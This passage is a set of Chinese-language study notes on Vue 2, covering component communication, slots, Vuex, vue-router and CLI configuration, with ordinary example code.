	│   │── App.vue: 汇总所有组件
	│   │── main.js: 入口文件
	├── .gitignore: git版本管制忽略的配置
	├── babel.config.js: babel的配置文件
	├── package.json: 应用包配置文件 
	├── README.md: 应用描述文件
	├── package-lock.json：包版本控制文件

## 关于不同版本的Vue

1. vue.js与vue.runtime.xxx.js的区别：
    1. vue.js是完整版的Vue，包含：核心功能 + 模板解析器。
    2. vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。
2. 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template这个配置项，需要使用render函数接收到的createElement函数去指定具体内容。

## vue.config.js配置文件

1. 使用vue inspect > output.js可以查看到Vue脚手架的默认配置。
2. 使用vue.config.js可以对脚手架进行个性化定制，详情见：https://cli.vuejs.org/zh

## ref属性

1. 被用来给元素或子组件注册引用信息（id的替代者）
2. 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
3. 使用方式：
    1. 打标识：```<h1 ref="xxx">.....</h1>``` 或 ```<School ref="xxx"></School>```
    2. 获取：```this.$refs.xxx```

## props配置项

1. 功能：让组件接收外部传过来的数据

2. 传递数据：```<Demo name="xxx"/>```

3. 接收数据：

    1. 第一种方式（只接收）：```props:['name'] ```
    2. 第二种方式（限制类型）：```props:{name:String}```
    3. 第三种方式（限制类型、限制必要性、指定默认值）：
    4. 子组件不能直接修改父组件传递的数据，如果要修改，可以先赋值，然后再修改

        ```js
        props:{
        	name:{
                type:String, //类型
                required:true, //必要性
                default:'老王' //默认值
        	},
             // 传递数组
            arr: {
                type: Array,
                default: function () {
                    return []
                }
            },
            // 传递对象
            obj: {
                type: Object,
                default() {
                    return {
                       a: 333
                    }
                }
            }
        }
        ```

    > 备注：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。

## mixin(混入)

1. 功能：可以把多个组件共用的配置提取成一个混入对象

2. 使用方式：

    第一步定义混合：

    ```
    {
        data(){....},
        methods:{....}
        ....
    }
    ```

    第二步使用混入：

    ​	全局混入：```Vue.mixin(xxx)```
    ​	局部混入：```mixins:['xxx']	```
    
    ```
    export const newData = {
        data(){
            return {
                a:11,
                b:22
            }
        },
        mounted() {
            console.log('minxins----mounted')
        },
    }
    ```

## 插件

1. 功能：用于增强Vue
2. 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。
3. 定义插件：

    ```js
    对象.install = function (Vue, options) {
        // 1. 添加全局过滤器
        Vue.filter(....)
    
        // 2. 添加全局指令
        Vue.directive(....)
    
        // 3. 配置全局混入(合)
        Vue.mixin(....)
    
        // 4. 添加实例方法
        Vue.prototype.$myMethod = function () {...}
        Vue.prototype.$myProperty = xxxx
    }
    ```

4. 使用插件：```Vue.use()```

```
export default {
    install(Vue) {
        console.log('install', Vue)
        Vue.filter('mySlice', function (value) {
            return value.slice(0, 4)
        })

        Vue.directive("fbind", {
            bind(element, binding) {
                    console.log(element.value);
                    element.value = binding.value;
                },
                inserted(element) {
                    element.focus();
                },
                update(element, binding) {
                    element.value = binding.value;
                },
        });
        Vue.mixin({
            data(){
                return {
                    a:11,
                    b:22
                }
            },
        })

        Vue.prototype.hello = function () {
         alert('你好啊')
        };
    }
}
```

## scoped样式

1. 作用：让样式在局部生效，防止冲突。
2. 写法：```<style scoped>```

## 总结TodoList案例

1. 组件化编码流程：

    ​	(1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。

    ​	(2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：

    ​			1).一个组件在用：放在组件自身即可。

    ​			2). 一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。

    ​	(3).实现交互：从绑定事件开始。

2. props适用于：

    ​	(1).父组件 ==> 子组件 通信

    ​	(2).子组件 ==> 父组件 通信（要求父先给子一个函数）

3. 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！

4. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。

## webStorage

1. 存储内容大小一般支持5MB左右（不同浏览器可能还不一样）

2. 浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。

3. 相关API：

    1. ```xxxxxStorage.setItem('key', 'value');```
        				该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。

    2. ```xxxxxStorage.getItem('person');```

        ​		该方法接受一个键名作为参数，返回键名对应的值。

    3. ```xxxxxStorage.removeItem('key');```

        ​		该方法接受一个键名作为参数，并把该键名从存储中删除。

    4. ``` xxxxxStorage.clear()```

        ​		该方法会清空存储中的所有数据。

4. 备注：

    1. SessionStorage存储的内容会随着浏览器窗口关闭而消失。
    2. LocalStorage存储的内容，需要手动清除才会消失。
    3. ```xxxxxStorage.getItem(xxx)```如果xxx对应的value获取不到，那么getItem的返回值是null。
    4. ```JSON.parse(null)```的结果依然是null。

## 组件的自定义事件

1. 一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。

3. 绑定自定义事件：

    1. 第一种方式，在父组件中：```<Demo @atguigu="test"/>```  或 ```<Demo v-on:atguigu="test"/>```

    2. 第二种方式，在父组件中：（灵活性好，可以使用setTimeOut来处理）

        ```js
        <Demo ref="demo"/>
        ......
        mounted(){
           this.$refs.xxx.$on('atguigu',this.test)
        }
        ```

    3. 若想让自定义事件只能触发一次，可以使用```once```修饰符，或```$once```方法。

4. 触发自定义事件：```this.$emit('atguigu',数据)```		

5. 解绑自定义事件```this.$off('atguigu')```
解绑多个自定义事件 ```this.$off(['atguigu','demo'])```

6. 组件上也可以绑定原生DOM事件，需要使用```native```修饰符。

7. 注意：通过```this.$refs.xxx.$on('atguigu',回调)```绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！（谁触发这个事件this就指向谁）

8.```this.$destroy() ```
销毁了当前Student组件的实例，销毁后所有Student实例的自定义事件全都不奏效。原生事件有效但是数据不再响应式

## 全局事件总线（GlobalEventBus）
new Vue()实例化了一个Vue的实例化对象

因为只有组件对象或者Vue的实例化对象才能调用$on和$emit

想要成为事件总线的条件：
1、所有的组件对象必须都能看得到这个总线对象，因此我们把这个对象放在了Vue原型
2、这个事件总线对象必须能调用$on和$emit方法（总线对象必须是Vue的实例化对象或者是组件对象）

1. 一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 安装全局事件总线：

   ```js
   new Vue({
   	......
   	beforeCreate() {
   		Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
   	},
       ......
   }) 
   

    // 不推荐
    const Demo = Vue.extend({})
    const d = new Demo()
    console.log('main.js', Demo,d)

    Vue.prototype.$bus = d

   ```

3. 使用事件总线：

   1. 接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span>

      ```js
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.$bus.$on('xxxx',this.demo)
      }

      // 推荐使用
      this.$bus.$on('getStudentName',(data)=>{
       console.log('我是school,我收到的数据',data)
      })
      ```

   2. 提供数据：```this.$bus.$emit('xxxx',数据)```

4. 最好在beforeDestroy钩子中，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。

## 消息订阅与发布（pubsub）

1.   一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。

2. 使用步骤：

   1. 安装pubsub：```npm i pubsub-js```

   2. 引入: ```import pubsub from 'pubsub-js'```

   3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span>

      ```js
      methods(){
        demo(data){......}
      }
      ......
      mounted() {
        this.pid = pubsub.subscribe('xxx',this.demo) //订阅消息
      }

      // 推荐使用
       this.pubId = pubsub.subscribe('getStudentName',(msgName,data)=>{
        console.log('school收到消息',msgName,data)
        })
      ```

   4. 提供数据：```pubsub.publish('xxx',数据)```

   5. 最好在beforeDestroy钩子中，用```PubSub.unsubscribe(pid)```去<span style="color:red">取消订阅。</span>
	
## nextTick

1. 语法：```this.$nextTick(回调函数)```
2. 作用：在下一次 DOM 更新结束后执行其指定的回调。
3. 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。

## Vue封装的过度与动画

1. 作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。

2. 图示：<img src="https://img04.sogoucdn.com/app/a/100520146/5990c1dff7dc7a8fb3b34b4462bd0105" style="width:60%" />

3. 写法：

   1. 准备好样式：

      - 元素进入的样式：
        1. v-enter：进入的起点
        2. v-enter-active：进入过程中
        3. v-enter-to：进入的终点
      - 元素离开的样式：
        1. v-leave：离开的起点
        2. v-leave-active：离开过程中
        3. v-leave-to：离开的终点

   2. 使用```<transition>```包裹要过度的元素，并配置name属性：

      ```vue
      <transition name="hello">
      	<h1 v-show="isShow">你好啊！</h1>
      </transition>
      ```

   3. 备注：若有多个元素需要过度，则需要使用：```<transition-group>```，且每个元素都要指定```key```值。

   ```
    <transition-group appear>
      <h1 v-show="isShow" key="1">{{ msg }}</h1>
      <h1 v-show="!isShow" key="2">{{ msg1 }}</h1>
    </transition-group>
   ```

## vue脚手架配置代理

### 方法一

​	在vue.config.js中添加如下配置：

```js
devServer:{
  proxy:"http://localhost:5000"
}
```

说明：

1. 优点：配置简单，请求资源时直接发给前端（8080）即可。
2. 缺点：不能配置多个代理，不能灵活的控制请求是否走代理。
3. 工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）

### 方法二

​	编写vue.config.js配置具体代理规则：

```js
module.exports = {
	devServer: {
      proxy: {
      '/api1': {// 匹配所有以 '/api1'开头的请求路径
        target: 'http://localhost:5000',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api1': ''}
      },
      '/api2': {// 匹配所有以 '/api2'开头的请求路径
        target: 'http://localhost:5001',// 代理目标的基础路径
        changeOrigin: true,
        pathRewrite: {'^/api2': ''}
      }
    }
  }
}
/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/
```

说明：

1. 优点：可以配置多个代理，且可以灵活的控制请求是否走代理。
2. 缺点：配置略微繁琐，请求资源时必须加前缀。

## 插槽

1. 作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===> 子组件</strong> 。

2. 分类：默认插槽、具名插槽、作用域插槽

3. 使用方式：

   1. 默认插槽：

      ```vue
      父组件中：
              <Category>
                 <div>html结构1</div>
              </Category>
      子组件中：
              <template>
                  <div>
                     <!-- 定义插槽 -->
                     <slot>插槽默认内容...</slot>
                  </div>
              </template>
      ```

   2. 具名插槽：

      ```vue
      父组件中：
              <Category>
                 // slot="center" 在任何标签上都可以使用
                  <template slot="center">
                    <div>html结构1</div>
                  </template>
                 <!--  v-slot:footer 必须在template标签上才能使用 -->
                  <template v-slot:footer>
                     <div>html结构2</div>
                  </template>
              </Category>
      子组件中：
              <template>
                  <div>
                     <!-- 定义插槽 -->
                     <slot name="center">插槽默认内容...</slot>
                     <slot name="footer">插槽默认内容...</slot>
                  </div>
              </template>
      ```

   3. 作用域插槽：

      1. 理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）

      2. 具体编码：

         ```vue
         父组件中：
         		<Category>
                   // scope="scopeData" 旧的语法
         			<template scope="scopeData">
         				<!-- 生成的是ul列表 -->
         				<ul>
         					<li v-for="g in scopeData.games" :key="g">{{g}}</li>
         				</ul>
         			</template>
         		</Category>
         
         		<Category>
                   // slot-scope="scopeData" 新的语法
         			<template slot-scope="scopeData">
         				<!-- 生成的是h4标题 -->
         				<h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
         			</template>
         		</Category>
         子组件中：
                 <template>
                     <div>
                         <slot :games="games"></slot>
                     </div>
                 </template>
         		
                 <script>
                     export default {
                         name:'Category',
                         props:['title'],
                         //数据在子组件自身
                         data() {
                             return {
                                 games:['红色警戒','穿越火线','劲舞团','超级玛丽']
                             }
                         },
                     }
                 </script>
         ```
   ```
   
   ```
## Vuex

### 1.概念

​		在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。

### 2.何时使用？

​		多个组件需要共享数据时

### 3.搭建vuex环境

1. 创建文件：```src/store/index.js```

   ```js
   //引入Vue核心库
   import Vue from 'vue'
   //引入Vuex
   import Vuex from 'vuex'
   //应用Vuex插件
   Vue.use(Vuex)
   
   //准备actions对象——响应组件中用户的动作
   const actions = {}
   //准备mutations对象——修改state中的数据
   const mutations = {}
   //准备state对象——保存具体的数据
   const state = {}
   
   //创建并暴露store
   export default new Vuex.Store({
   	actions,
   	mutations,
   	state
   })
   ```

2. 在```main.js```中创建vm时传入```store```配置项

   ```js
   ......
   //引入store
   import store from './store'
   ......
   
   //创建vm
   new Vue({
   	el:'#app',
   	render: h => h(App),
   	store
   })
   ```

###    4.基本使用

1. 初始化数据、配置```actions```、配置```mutations```，操作文件```store.js```

   ```js
   //引入Vue核心库
   import Vue from 'vue'
   //引入Vuex
   import Vuex from 'vuex'
   //引用Vuex
   Vue.use(Vuex)
   
   const actions = {
       //响应组件中加的动作
   	jia(context,value){
   		// console.log('actions中的jia被调用了',miniStore,value)
   		context.commit('JIA',value)
   	},
   }
   
   const mutations = {
       //执行加
   	JIA(state,value){
   		// console.log('mutations中的JIA被调用了',state,value)
   		state.sum += value
   	}
   }
   
   //初始化数据
   const state = {
      sum:0
   }
   
   //创建并暴露store
   export default new Vuex.Store({
   	actions,
   	mutations,
   	state,
   })
   ```

2. 组件中读取vuex中的数据：```$store.state.sum```

3. 组件中修改vuex中的数据：```$store.dispatch('action中的方法名',数据)``` 或 ```$store.commit('mutations中的方法名',数据)```

   >  备注：若没有网络请求或其他业务逻辑，组件中也可以越过actions，即不写```dispatch```，直接编写```commit```

### 5.getters的使用

1. 概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。

2. 在```store.js```中追加```getters```配置

   ```js
   ......
   
   const getters = {
   	bigSum(state){
   		return state.sum * 10
   	}
   }
   
   //创建并暴露store
   export default new Vuex.Store({
   	......
   	getters
   })
   ```

3. 组件中读取数据：```$store.getters.bigSum```

### 6.四个map方法的使用

1. <strong>mapState方法：</strong>用于帮助我们映射```state```中的数据为计算属性

   ```js
   computed: {
       //借助mapState生成计算属性：sum、school、subject（对象写法）
        ...mapState({sum:'sum',school:'school',subject:'subject'}),
            
       //借助mapState生成计算属性：sum、school、subject（数组写法）
       ...mapState(['sum','school','subject']),
   },
   ```

2. <strong>mapGetters方法：</strong>用于帮助我们映射```getters```中的数据为计算属性

   ```js
   computed: {
       //借助mapGetters生成计算属性：bigSum（对象写法）
       ...mapGetters({bigSum:'bigSum'}),
   
       //借助mapGetters生成计算属性：bigSum（数组写法）
       ...mapGetters(['bigSum'])
   },
   ```

3. <strong>mapActions方法：</strong>用于帮助我们生成与```actions```对话的方法，即：包含```$store.dispatch(xxx)```的函数

   ```js
   methods:{
       //靠mapActions生成：incrementOdd、incrementWait（对象形式）
       ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   
       //靠mapActions生成：incrementOdd、incrementWait（数组形式）
       ...mapActions(['jiaOdd','jiaWait'])
   }
   ```

4. <strong>mapMutations方法：</strong>用于帮助我们生成与```mutations```对话的方法，即：包含```$store.commit(xxx)```的函数

   ```js
   methods:{
       //靠mapActions生成：increment、decrement（对象形式）
       ...mapMutations({increment:'JIA',decrement:'JIAN'}),
       
       //靠mapMutations生成：JIA、JIAN（对象形式）
       ...mapMutations(['JIA','JIAN']),
   }
   ```

> 备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。

### 7.模块化+命名空间

1. 目的：让代码更好维护，让多种数据分类更加明确。

2. 修改```store.js```

   ```javascript
   const countAbout = {
     namespaced:true,//开启命名空间
     state:{x:1},
     mutations: { ... },
     actions: { ... },
     getters: {
       bigSum(state){
          return state.sum * 10
       }
     }
   }
   
   const personAbout = {
     namespaced:true,//开启命名空间
     state:{ ... },
     mutations: { ... },
     actions: { ... }
   }
   
   const store = new Vuex.Store({
     modules: {
       countAbout,
       personAbout
     }
   })
   ```

3. 开启命名空间后，组件中读取state数据：

   ```js
   //方式一：自己直接读取
   this.$store.state.personAbout.list
   //方式二：借助mapState读取：
   ...mapState('countAbout',['sum','school','subject']),
   ```

4. 开启命名空间后，组件中读取getters数据：

   ```js
   //方式一：自己直接读取
   this.$store.getters['personAbout/firstPersonName']
   //方式二：借助mapGetters读取：
   ...mapGetters('countAbout',['bigSum'])
   ```

5. 开启命名空间后，组件中调用dispatch

   ```js
   //方式一：自己直接dispatch
   this.$store.dispatch('personAbout/addPersonWang',person)
   //方式二：借助mapActions：
   ...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   ```

6. 开启命名空间后，组件中调用commit

   ```js
   //方式一：自己直接commit
   this.$store.commit('personAbout/ADD_PERSON',person)
   //方式二：借助mapMutations：
   ...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),
   ```

 ## 路由

1. 理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。
2. 前端路由：key是路径，value是组件。

### 1.基本使用

1. 安装vue-router，命令：```npm i vue-router```

2. 应用插件：```Vue.use(VueRouter)```

3. 编写router配置项:

   ```js
   //引入VueRouter
   import VueRouter from 'vue-router'
   //引入Luyou 组件
   import About from '../components/About'
   import Home from '../components/Home'
   
   //创建router实例对象，去管理一组一组的路由规则
   const router = new VueRouter({
   	routes:[
   		{
   			path:'/about',
   			component:About
   		},
   		{
   			path:'/home',
   			component:Home
   		}
   	]
   })
   
   //暴露router
   export default router
   ```

4. 实现切换（active-class可配置高亮样式）

   ```vue
   <router-link active-class="active" to="/about">About</router-link>
   ```

5. 指定展示位置

   ```vue
   <router-view></router-view>
   ```

### 2.几个注意点

1. 路由组件通常存放在```pages```文件夹，一般组件通常存放在```components```文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的```$route```属性，里面存储着自己的路由信息。
4. 整个应用只有一个router，可以通过组件的```$router```属性获取到。

### 3.多级路由（多级路由）

1. 配置路由规则，使用children配置项：

   ```js
   routes:[
   	{
   		path:'/about',
   		component:About,
   	},
   	{
   		path:'/home',
   		component:Home,
   		children:[ //通过children配置子级路由
   			{
   				path:'news', //此处一定不要写：/news
   				component:News
   			},
   			{
   				path:'message',//此处一定不要写：/message
   				component:Message
   			}
   		]
   	}
   ]
   ```

2. 跳转（要写完整路径）：

   ```vue
   <router-link to="/home/news">News</router-link>
   ```

### 4.路由的query参数

1. 传递参数

   ```vue
   <!-- 跳转并携带query参数，to的字符串写法 -->
   <router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
   				
   <!-- 跳转并携带query参数，to的对象写法 -->
   <router-link 
   	:to="{
   		path:'/home/message/detail',
   		query:{
   		   id:666,
               title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

2. 接收参数：

   ```js
   $route.query.id
   $route.query.title
   ```

### 5.命名路由

1. 作用：可以简化路由的跳转。

2. 如何使用

   1. 给路由命名：

      ```js
      {
      	path:'/demo',
      	component:Demo,
      	children:[
      		{
      			path:'test',
      			component:Test,
      			children:[
      				{
                name:'hello' //给路由命名
      					path:'welcome',
      					component:Hello,
      				}
      			]
      		}
      	]
      }
      ```

   2. 简化跳转：

      ```vue
      <!--简化前，需要写完整的路径 -->
      <router-link to="/demo/test/welcome">跳转</router-link>
      
      <!--简化后，直接通过名字跳转 -->
      <router-link :to="{name:'hello'}">跳转</router-link>
      
      <!--简化写法配合传递参数 -->
      <router-link 
      	:to="{
      		name:'hello',
      		query:{
      		   id:666,
                  title:'你好'
      		}
      	}"
      >跳转</router-link>
      ```

### 6.路由的params参数

1. 配置路由，声明接收params参数

   ```js
   {
   	path:'/home',
   	component:Home,
   	children:[
   		{
   			path:'news',
   			component:News
   		},
   		{
   			component:Message,
   			children:[
   				{
   					name:'xiangqing',
   					path:'detail/:id/:title', //使用占位符声明接收params参数
   					component:Detail
   				}
   			]
   		}
   	]
   }
   ```

2. 传递参数

   ```vue
   <!-- 跳转并携带params参数，to的字符串写法 -->
   <router-link :to="/home/message/detail/666/你好">跳转</router-link>
   				
   <!-- 跳转并携带params参数，to的对象写法 -->
   <router-link 
   	:to="{
   		name:'xiangqing',
   		params:{
   		   id:666,
          title:'你好'
   		}
   	}"
   >跳转</router-link>
   ```

   > 特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！

3. 接收参数：

   ```js
   $route.params.id
   $route.params.title
   ```

### 7.路由的props配置

​	作用：让路由组件更方便的收到参数

```js
{
	name:'xiangqing',
	path:'detail/:id',
	component:Detail,

	//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件
	// props:{a:900}

	//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件
	// props:true
	
	//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件
	props(route){
		return {
			id:route.query.id,
			title:route.query.title
		}
	}
}
```

### 8.```<router-link>```的replace属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：分别为```push```和```replace```，```push```是追加历史记录，```replace```是替换当前记录。路由跳转时候默认为```push```
3. 如何开启```replace```模式：```<router-link replace .......>News</router-link>```

### 9.编程式路由导航

1. 作用：不借助```<router-link> ```实现路由跳转，让路由跳转更加灵活

2. 具体编码：

   ```js
   //$router的两个API
   this.$router.push({
   	name:'xiangqing',
   		params:{
   			id:xxx,
   			title:xxx
   		}
   })
   
   this.$router.replace({
   	name:'xiangqing',
   		params:{
   			id:xxx,
   			title:xxx
   		}
   })
   this.$router.forward() //前进
   this.$router.back() //后退
   this.$router.go() //可前进也可后退
   ```

### 10.缓存路由组件

1. 作用：让不展示的路由组件保持挂载，不被销毁。

2. 具体编码：

   ```vue
   <keep-alive include="News"> 
       <router-view></router-view>
   </keep-alive>
   ```

### 11.两个新的生命周期钩子

1. 作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。
2. 具体名字：
   1. ```activated```路由组件被激活时触发。
   2. ```deactivated```路由组件失活时触发。

### 12.路由守卫

1. 作用：对路由进行权限控制

2. 分类：全局守卫、独享守卫、组件内守卫

3. 全局守卫:

   ```js
   //全局前置守卫：初始化时执行、每次路由切换前执行
   router.beforeEach((to,from,next)=>{
   	console.log('beforeEach',to,from)
   	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
   		if(localStorage.getItem('school') === 'atguigu'){ //权限控制的具体规则
   			next() //放行
   		}else{
   			alert('暂无权限查看')
   			// next({name:'guanyu'})
   		}
   	}else{
   		next() //放行
   	}
   })
   
   //全局后置守卫：初始化时执行、每次路由切换后执行
   router.afterEach((to,from)=>{
   	console.log('afterEach',to,from)
   	if(to.meta.title){ 
   		document.title = to.meta.title //修改网页的title
   	}else{
   		document.title = 'vue_test'
   	}
   })
   ```

4. 独享守卫:

   ```js
   beforeEnter(to,from,next){
   	console.log('beforeEnter',to,from)
   	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
   		if(localStorage.getItem('school') === 'atguigu'){
   			next()
   		}else{
   			alert('暂无权限查看')
   			// next({name:'guanyu'})
   		}
   	}else{
   		next()
   	}
   }
   ```

5. 组件内守卫：

   ```js
   //进入守卫：通过路由规则，进入该组件时被调用
   beforeRouteEnter (to, from, next) {
   },
   //离开守卫：通过路由规则，离开该组件时被调用
   beforeRouteLeave (to, from, next) {
   }
   ```

### 13.路由器的两种工作模式



1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。
2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。
3. hash模式：
   1. 地址中永远带着#号，不美观 。
   2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
   3. 兼容性较好。
4. history模式：
   1. 地址干净，美观 。
   2. 兼容性和hash模式相比略差。
   3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。
	
	 

# index.html
在index.html中引入pubic下的文件，<%= BASE_URL %>就代表了public
`<link rel="icon" href="<%= BASE_URL %>logo.png">`

# main.js
因为脚手架默认引入的残缺版的vue，所以没有template模板解析器,render可以代替templat模板解析器，或者引入完整版的vue，模板解析器占整个vue 1/3的体积，这样可以减少打包后的体积
```
 // render: h => h(App),
  render(createElement){
    return createElement('h1','你好啊')
  }
```
# display:none、visibility:hidden 和 opacity:0 之间的区别？

# 小知识点
1. vue中undefined的值不呈现到页面上
2. vue中注释多行代码不可以折叠 开始 //#region  结束 //#endregion
3. 字符串的方法中都包含空字符串''  （一个字符串indexOf一个空字符串是0不是-1）				
4. data中所有的属性，最后都出现在了vm身上。vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。
5. 查看所有webpack的版本
`npm view webpack versions`